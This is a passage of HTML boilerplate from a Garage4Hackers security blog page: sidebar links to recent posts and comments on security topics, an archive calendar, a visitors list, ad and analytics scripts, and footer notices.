	<a class="smallavatar">
		
		<img alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry94bc.html?b=3087">Everything you need to know about CVE-2014-6271</a>
		
		<br/>
		
		09-25-2014 <span class="time">05:45 AM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entryf50f.html?b=3073">Low hanging Web Application bugs in Digital Cable :Hacking Cable TV Networks Part 1</a>
		
		<br/>
		
		08-06-2014 <span class="time">03:30 AM</span>
	</div>
</li>
				</ul>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

	<li id="block_comments">
		<div class="block smaller moveable" id="block_comments_div">
			<div class="blocksubhead" id="block_comments_handle">
				<a class="collapse" href="#top" id="collapse_c_blog_comments"><img alt="" src="images/buttons/collapse_40b.png"/></a>
				<a href="bloge2b6.html?u=8&amp;do=comments">Recent Comments</a>
			</div>
			<div class="blockbody" id="c_blog_comments">
				<ul class="blockrow">
					<li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="images/misc/unknown.gif" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entryb3ce.html?b=3105&amp;bt=3227#comment3227">Maldrone the First Backdoor for drones.</a>

		<br/>

		
		<span class="shade">by <a class="shade" href="member47d6.html?u=25275" rel="nofollow">leeladitya</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="images/misc/unknown.gif" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entrye119.html?b=3087&amp;bt=3182#comment3182">Everything you need to know about CVE-2014-6271</a>

		<br/>

		
		<span class="shade">by <a class="shade" href="member93c5.html?u=21" rel="nofollow">neo</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="images/misc/unknown.gif" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entryc255.html?b=392&amp;bt=3175#comment3175">Hacking RFID Acces Door .  Personal Diary #Non-Technical.</a>

		<br/>

		
		<span class="shade">by <a class="shade" href="memberf7ab.html?u=20549" rel="nofollow">cipher</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="sss836c.png?u=238&amp;dateline=1333021046&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entryc62b.html?b=3069&amp;bt=3155#comment3155">How the Internet Bug bounty Killed an Exploit Kit.</a>

		<br/>

		
		<span class="shade">by <a class="shade" href="member5665.html?u=238" rel="nofollow">[s]</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title="" width="30"/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entry3e65.html?b=785&amp;bt=871#comment871">DEP ASLR bypass without ROP JIT : CanSecWest2013 Slides and Analysis</a>

		<br/>

		
		<span class="shade">by <a class="shade" href="membere81f.html?u=8" rel="nofollow">fb1h2s</a></span>
		
	</div>
</li>
				</ul>
			</div>
		</div>
		<div class="underblock"></div>
	</li>
<li id="block_archive">
	<div class="block blogusermenu" id="vb_blogcalendar">
		<div class="calendar mini" id="block_archive_div">
	<h4 class="blocksubhead smaller moveable" id="block_archive_handle">
		<a class="collapse" href="#top" id="collapse_c_blog_calendar"><img alt="" src="images/buttons/collapse_40b.png"/></a>
		Archive
	</h4>
	<div class="blockbody" id="c_blog_calendar">
		<table class="blockrow" width="100%">
			<tbody><tr>
				
					<th align="center" class="blocksubhead" id="vb_blogcalendar_prevmonth" prevmonth="1" prevyear="2015">
						 
						
							<a href="blogb903.html?u=8&amp;m=1&amp;y=2015">&lt;</a>
						
						 
					</th>
									
				<th align="center" class="blocksubhead" colspan="5" id="vb_blogcalendar_currentmonth">
					
						<a href="blog9b8e.html?u=8&amp;m=3&amp;y=2020">March 2020</a>
					
				</th>
				
					<th class="blocksubhead">
						   
					</th>
 				
         		</tr>
			<tr align="center">
				<td class="blogsubheader">Su</td>
				<td class="blogsubheader">Mo</td>
				<td class="blogsubheader">Tu</td>
				<td class="blogsubheader">We</td>
				<td class="blogsubheader">Th</td>
				<td class="blogsubheader">Fr</td>
				<td class="blogsubheader">Sa</td>
			</tr>
			<tr><td class="othermonth">
	
		<span class="simpleday">23</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">24</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">25</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">26</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">27</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">28</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">29</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">1</span>
	
</td><td>
	
		<span class="simpleday">2</span>
	
</td><td>
	
		<span class="simpleday">3</span>
	
</td><td>
	
		<span class="simpleday">4</span>
	
</td><td>
	
		<span class="simpleday">5</span>
	
</td><td>
	
		<span class="simpleday">6</span>
	
</td><td>
	
		<span class="simpleday">7</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">8</span>
	
</td><td>
	
		<span class="simpleday">9</span>
	
</td><td>
	
		<span class="simpleday">10</span>
	
</td><td>
	
		<span class="simpleday">11</span>
	
</td><td>
	
		<span class="simpleday">12</span>
	
</td><td>
	
		<span class="simpleday">13</span>
	
</td><td>
	
		<span class="simpleday">14</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">15</span>
	
</td><td>
	
		<span class="simpleday">16</span>
	
</td><td>
	
		<span class="simpleday">17</span>
	
</td><td>
	
		<span class="simpleday">18</span>
	
</td><td>
	
		<span class="simpleday">19</span>
	
</td><td>
	
		<span class="simpleday">20</span>
	
</td><td>
	
		<span class="simpleday">21</span>
	
</td></tr><tr><td class="today" title="Today">
	
		<span class="simpleday">22</span>
	
</td><td>
	
		<span class="simpleday">23</span>
	
</td><td>
	
		<span class="simpleday">24</span>
	
</td><td>
	
		<span class="simpleday">25</span>
	
</td><td>
	
		<span class="simpleday">26</span>
	
</td><td>
	
		<span class="simpleday">27</span>
	
</td><td>
	
		<span class="simpleday">28</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">29</span>
	
</td><td>
	
		<span class="simpleday">30</span>
	
</td><td>
	
		<span class="simpleday">31</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">1</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">2</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">3</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">4</span>
	
</td></tr>
		</tbody></table>
	</div>
</div>
	</div>
	<div class="underblock"></div>
	<script src="clientscript/blog_ajax_calendar6719.js?v=421" type="text/javascript"></script>
	<script type="text/javascript">
	<!--
		blogCalendar = new vB_AJAX_BlogCalendar('blogCalendar', 'vb_blogcalendar', 3, 2020, 8);
	//-->
	</script>
</li>
<li id="block_visitors">
	<div class="block" id="block_visitors_div">
		<div class="blocksubhead" id="block_visitors_handle">
			<a class="collapse" href="#top" id="collapse_c_blog_visitors"><img alt="" border="0" id="collapseimg_blog_visitors" src="images/buttons/collapse_40b.png"/></a>
			Recent Visitors
		</div>
		<div class="blockbody" id="c_blog_visitors">
			<div class="blockrow">
				<ul class="commalist" id="recent_visitors_list">
					
						<li><a class="username" href="member1e56.html?u=26373">andymarcus</a>, </li>
					
						<li><a class="username" href="member3406.html?u=26190">em616</a>, </li>
					
						<li><a class="username" href="member8eb6.html?u=26085">Kabalu</a>, </li>
					
						<li><a class="username" href="member47d6.html?u=25275">leeladitya</a>, </li>
					
						<li><a class="username" href="memberfeac.html?u=25980">nitmalviya03</a>, </li>
					
						<li><a class="username" href="memberdb7f.html?u=25940">noor46968</a>, </li>
					
						<li><a class="username" href="member0297.html?u=26164">shadowfox</a>, </li>
					
						<li><a class="username" href="member9e83.html?u=25329">stnlrgrs</a>, </li>
					
						<li><a class="username" href="member2ab6.html?u=26103">tannyl</a>, </li>
					
						<li><a class="username" href="memberb428.html?u=25907">Test12</a></li>
					
				</ul>
			</div>
		</div>
	</div>
	<div class="underblock"></div>
</li>

	<li id="block_category">
		<div class="block categoryblock" id="block_category_div">
			<div class="blocksubhead smaller moveable" id="block_category_handle">
				<a class="collapse" href="#top" id="collapse_c_blog_categories"><img alt="" src="images/buttons/collapse_40b.png"/></a>
				
				Blog Categories
			</div>
			<div class="blockbody" id="c_blog_categories">
				<div class="blockrow">
					
					
						<h2 class="local">Local Categories</h2>
						<ul class="folderlist hideoverflow">
							
<li>
	<img alt="Uncategorized" border="0" class="inlineimg" src="images/misc/blog/folder.png"/>
	
		
			<a href="blog71e7.html?u=8&amp;blogcategoryid=-1" title="Uncategorized">Uncategorized</a>
		
	
</li>
						</ul>
					
				</div>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

	</ul>
	
	
</div></div>
	
	<div class="cleardiv"></div>
</div>


<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
</div>

<div class="floatcontainer footer" id="footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label=" Standard Styles">
									
					
	<option class="" selected="selected" value="1">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label=" Mobile Styles">
					
					
	<option class="" value="2">-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul class="footer_links" id="footer_links">
		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="entryb4ba.html?b=316#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">04:21 PM</span>.</div>

<div class="shade footer_copyright" id="footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div class="shade footer_morecopyright" id="footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>

</div></body></html>